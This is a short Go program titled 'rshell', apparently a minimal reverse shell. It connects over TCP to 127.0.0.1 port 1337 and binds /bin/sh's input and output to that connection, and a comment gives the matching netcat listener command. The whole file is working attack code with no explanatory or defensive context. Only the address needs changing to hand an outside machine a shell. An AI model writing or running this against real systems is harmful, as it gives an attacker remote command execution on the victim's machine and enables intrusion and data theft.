package main
// rshell 
// nc -l 1337
//  
import"os/exec"
import"net"

func main(){
    c,_:=net.Dial("tcp","127.0.0.1:1337");
    cmd:=exec.Command("/bin/sh");
    cmd.Stdin=c;
    cmd.Stdout=c;
    cmd.Stderr=c;
    cmd.Run();
}